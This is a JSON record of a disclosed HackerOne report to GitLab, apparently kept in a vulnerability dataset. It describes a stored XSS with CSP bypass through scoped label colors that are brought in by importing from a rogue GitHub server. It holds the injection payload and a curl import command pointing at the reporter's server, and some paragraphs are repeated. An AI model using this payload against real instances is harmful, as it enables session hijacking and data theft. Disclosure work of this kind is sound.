{
  "reported_to": "GitLab",
  "reported_by": "yvvdwf ",
  "title": "Bypass: Stored-XSS with CSP-bypass via scoped labels' color",
  "content": "\nHi team,\nThe Stored-XSS with CSP-bypass via labels' color has been mitigated in Gitlab 15.3.2. However it is not enough because it missed the case of scoped label.\nI notified this missing in the original report and @galfaro encouraged me to submit a new report about this.\nStep to reproduce:\nTo reproduce, we need the following prerequisites:\nScoped labels are available in Gitlab Premium, so we need a premium account that can be obtained via the free trial\nA Gitlab personal access token. Go here to create a new token with within api scope.\nScoped labels are available in Gitlab Premium, so we need a premium account that can be obtained via the free trial\nA Gitlab personal access token. Go here to create a new token with within api scope.\nGithub does not allow to create arbitrary label colors. You can find in the attachment a dummy Github server in which we set a new label:\nname: yvvdwf::label-name (the :: to scope the label)\ncolor: \">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>\nname: yvvdwf::label-name (the :: to scope the label)\ncolor: \">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>\nTo easily reproduce, I'm hosting the dummy Github server at my own VPS, http://51.75.74.52:11211, I will shut it down once you validated the report.\nOpen a new terminal, then run the following command, in which:\n$GL_TOKEN is the the api token you've created above\nyvvdwf-group-a is a group (or account) name having premium features\n$GL_TOKEN is the the api token you've created above\nyvvdwf-group-a is a group (or account) name having premium features\nFor example:\nCode 403 Bytes\n1curl -kv \"https://gitlab.com/api/v4/import/github\" \\\n2  --request POST \\\n3  --header \"content-type: application/json\" \\\n4  --header \"PRIVATE-TOKEN: $GL_TOKEN\" \\\n5  --data '{\n6    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n7    \"repo_id\": \"523303538\",\n8    \"target_namespace\": \"yvvdwf-group-a\",\n9    \"new_name\": \"xss-on-label-color\",\n10    \"github_hostname\": \"http://51.75.74.52:11211\"\n11}'\nAfter finishing, you can view the list of the label of the imported project. You should see a popup created by this javascript alert(document.domain)\nSince we can control the label color, we can create a Stored-XSS with CSP-bypass on another place rather than the page that lists the labels, such as, an issue or a merged request of another project by using GitLab-specific references\nExample:\nhttps://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels\nhttps://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\nBeside that, I would like to clarify some other metrics in the CVSS (the text in bold is copied from your cvss calculator )\nAC:L: Stored XSS on a page that's part of the user's normal workflow (issue or merge request page): As I mentioned above the store-XSS is on the issue/MR requests of a project the attack may create an issue/MR\nPR:N: The attacker is logged out - PR:N - but the victim is logged in: The stored-XSS still exist even the attacker is logged out.\nC:H: Access tokens, runner tokens. Private repositories: Indeed the XSS allows to execute any Rest API on behalf of the victim to get almost arbitrary private information of the victim (unless his password). It can even perform a fake account-take-over by changing the victim's username and immediately register a new account within the victim's username (as changing username does not require to confirm password)\nA:L: This Store-XSS with CSP-bypass can easily create DoS at the client side by exhausting CPU and RAM of the victim's Web browser. It can also be used to send as much as possible the requests to the server. The number of requests can increase by the number of victims who are viewing the XSS.\nBest regards,\nImpact\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1676864580,
  "report_url": "https://hackerone.com/reports/1693150",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a premium GitLab account with scoped labels enabled and obtain a personal access token with API scope."
    ],
    [
      2,
      "Use a modified GitHub server to create a label with a malicious color value containing XSS payload in the format: '>yvvdwf-label<form class=\"hidden gl-show-field-errors\"><input title=\"<script>alert(document.domain)</script>'>'"
    ],
    [
      3,
      "Import the malicious label into GitLab using the API with a curl command that specifies the GitHub server URL, target namespace, and the malicious label details."
    ],
    [
      4,
      "Trigger the XSS by viewing the imported label in GitLab's interface, which executes the JavaScript payload due to improper sanitization of the label color field."
    ]
  ],
  "vuln_description": "A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's handling of scoped label colors during GitHub imports, allowing attackers to bypass Content Security Policy (CSP) and execute arbitrary JavaScript in the context of the victim's session. The vulnerability stems from insufficient sanitization of label color values in scoped labels, which were not fully addressed in the initial fix for regular labels.",
  "reason": "The vulnerability requires understanding of multiple components: GitLab's label system, GitHub import functionality, CSP bypass techniques, and scoped label handling. The attacker must chain these components together in a non-obvious way, including setting up a custom GitHub server with malicious payloads and understanding how GitLab processes imported labels. The interaction between scoped labels and the import functionality is particularly subtle.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves a Stored-XSS with CSP-bypass via scoped labels' color in GitLab, which is a client-side issue. The proposed methodologies focus on server-side authN/authZ bugs by testing combinations of user sessions, actions, and resource IDs. Since the XSS vulnerability does not involve crossing authorization boundaries or manipulating resource access, it falls outside the scope of the described detection methods.",
    "is_detectable": false
  }
}